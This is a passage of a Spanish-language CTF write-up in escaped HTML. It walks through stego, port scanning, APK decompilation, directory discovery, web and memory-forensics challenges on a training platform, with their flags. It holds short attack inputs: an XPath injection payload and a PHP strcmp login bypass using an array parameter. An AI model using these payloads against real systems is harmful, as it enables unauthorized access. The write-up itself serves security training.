+&lt;p&gt;Vemos un mensaje de flag pero no aparece nuestra flag como cadena normal, el texto que aparece en el campo de password parece ser base64 invertida, invertimos el mensaje y decodificamos.&lt;/p&gt;
+&lt;p&gt;Comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0HZy92dzNXYw9VZyV3YlNnbx8Fa0FzdfNXYwVWZr91ZuFzahVmcit3ZhxmZ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;rev&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;base64 -d
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag{break1ng_keepas_w1th_1nsecure_password}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;zero&#34;&gt;ZERO&lt;/h2&gt;
+&lt;p&gt;Para este reto escribí un script en python y con el codigo ascii que aparece en el archivo leeme.txt generamos un codigo de barras para luego obtener la bandera en &lt;a href=&#34;https://online-barcode-reader.inliteresearch.com/&#34;&gt;https://online-barcode-reader.inliteresearch.com/&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Codigo: &lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/stego_zero.py&#34;&gt;https://github.com/sckull/ctf-stuff/blob/master/stego_zero.py&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/stego_zero.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{qr_to_ascii_art}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;port&#34;&gt;PORT&lt;/h2&gt;
+&lt;p&gt;Para este reto hicimos un escaneo de puertos con nmap a la plataforma del ctf, encontramos el &lt;code&gt;puerto 1337&lt;/code&gt; al visitarlo nos muestra un error con nuestra flag.&lt;/p&gt;
+&lt;p&gt;Comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -p1-65535 ctf.develsecurity.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;PORT&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;STATE&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;SERVICE&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;VERSION&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;OpenSSH&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;p&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;ubuntu&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Linux&lt;/span&gt;; &lt;span class=&#34;nx&#34;&gt;protocol&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;filtered&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;smtp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;81&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;82&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;83&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;84&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;rpcbind&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2-4&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;RPC&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;#100000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1337&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;waste&lt;/span&gt;?&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Mensaje al visitar la pagina.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;xmp&lt;/span&gt;&amp;amp;&lt;span class=&#34;nx&#34;&gt;gt&lt;/span&gt;;&lt;span class=&#34;nx&#34;&gt;perl&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;warning&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;Setting&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;locale&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;failed&lt;/span&gt;.&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;perl&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;warning&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;Please&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;check&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;that&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;your&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;locale&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;settings&lt;/span&gt;:&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LANGUAGE&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LC_ALL&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LANG&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;es_GT.UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;are&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;supported&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;installed&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;your&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;.&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;perl&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;warning&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;Falling&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;back&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;standard&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;locale&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Unescaped&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;left&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;brace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;regex&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;deprecated&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passed&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;through&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;regex&lt;/span&gt;; &lt;span class=&#34;nx&#34;&gt;marked&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;!--&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;HERE&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/%{ --&amp;gt; HERE (.*?)}/&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;at&lt;/span&gt; &lt;span class=&#34;sr&#34;&gt;/usr/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bin&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;528&lt;/span&gt;.&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Error&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;no&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;flag{secret_in_the_port_is_null}&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag{secret_in_the_port_is_null}&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;mobile&#34;&gt;MOBILE&lt;/h1&gt;
+&lt;h2 id=&#34;mobile-1&#34;&gt;MOBILE&lt;/h2&gt;
+&lt;p&gt;Utilizamos &lt;code&gt;apktool&lt;/code&gt; para poder decompilar el archivo &lt;code&gt;Mobile1.apk&lt;/code&gt; y ver el codigo que tiene dentro. Tambien podemos utilizar &lt;a href=&#34;http://www.javadecompilers.com/&#34;&gt;http://www.javadecompilers.com/&lt;/a&gt; para el mismo fin.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/mobile1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;La flag se encuentra en &lt;code&gt;HelloWorldActivity&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Codigo generado por javadecompilers.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kn&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;com.example.helloworld&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;android.os.Bundle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;com.phonegap.DroidGap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;HelloWorldActivity&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DroidGap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Bundle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+        &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;loadUrl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;flag{de0fuscate_code}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag{de0fuscate_code}&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;web&#34;&gt;WEB&lt;/h1&gt;
+&lt;h2 id=&#34;hide-1&#34;&gt;HIDE&lt;/h2&gt;
+&lt;p&gt;Para este reto buscamos directorios comunes, tambien buscamos en el codigo fuente de las paginas. &lt;a href=&#34;http://ctf.develsecurity.com&#34;&gt;http://ctf.develsecurity.com&lt;/a&gt;:81/admin/flag.txt&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{http_directory_indexing}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;default&#34;&gt;DEFAULT&lt;/h2&gt;
+&lt;p&gt;De igual forma, algunos directorios comunes. &lt;a href=&#34;http://ctf.develsecurity.com&#34;&gt;http://ctf.develsecurity.com&lt;/a&gt;:82/install/&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{default_files_installation_fake_cms}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;inject&#34;&gt;INJECT&lt;/h2&gt;
+&lt;h4 id=&#34;xpath-injection&#34;&gt;XPATH INJECTION&lt;/h4&gt;
+&lt;p&gt;Probamos con alguno de los payloads aqui descritos y obtuvimos la flag.&lt;/p&gt;
+&lt;p&gt;Payloads: &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection&#34;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection&lt;/a&gt;&lt;br /&gt;
+Payload: &lt;code&gt;x&#39; or 1=1 or &#39;x&#39;=&#39;y&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{XPATH_1NJ3CT10N}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;bypass&#34;&gt;BYPASS&lt;/h2&gt;
+&lt;p&gt;Utilizamos el siguiente payload en metodo POST para obtener la bandera.&lt;/p&gt;
+&lt;p&gt;Payload: &lt;code&gt;?password[]=&amp;quot;&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://ctf.develsecurity.com&#34;&gt;http://ctf.develsecurity.com&lt;/a&gt;:84/login.php?password[]=%22%22&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{bypass_strcmp_function}&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;forensics&#34;&gt;FORENSICS&lt;/h1&gt;
+&lt;p&gt;Para este reto revisamos todas las conexiones que se hicieron durante el volcado de memoria de este archivo, no enocontramos alguna ip que se ejecutara bajo un proceso en especifico. Asumiendo que al realizar este volcado de memoria se identifico a algun tipo de intruso en la computadora revisamos el &amp;ldquo;historial&amp;rdquo; de comandos y encontramos que antes de realizar el volcado de memoria el usuario hizo ping a una direccion que no aparece por ningun lado (sockets,socketscan,connscan,etc).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_ip.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag: 192.168.21.161&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;nsazipraw&#34;&gt;NSA.ZIP[raw]&lt;/h2&gt;
+&lt;p&gt;Para este reto utilizamos volatility y algunos de sus comandos para obtener las flags.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_profile_nsa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Profile: &lt;code&gt;Win7SP1x64&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;hash-ntlm&#34;&gt;HASH NTLM&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_hash_nsa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag:31d6cfe0d16ae931b73c59d7e0c089c0&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user&#34;&gt;USER&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;flag: victim&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;pid&#34;&gt;PID&lt;/h2&gt;
+&lt;p&gt;Pid del proceso &lt;code&gt;wmpnetwk.exe&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_pid_nsa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag: 2464&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;sids&#34;&gt;SIDs&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_sid_nsa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag: S-1-5-21-3480093824-3207195214-1800084707-1001&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;computer-name&#34;&gt;COMPUTER NAME&lt;/h2&gt;
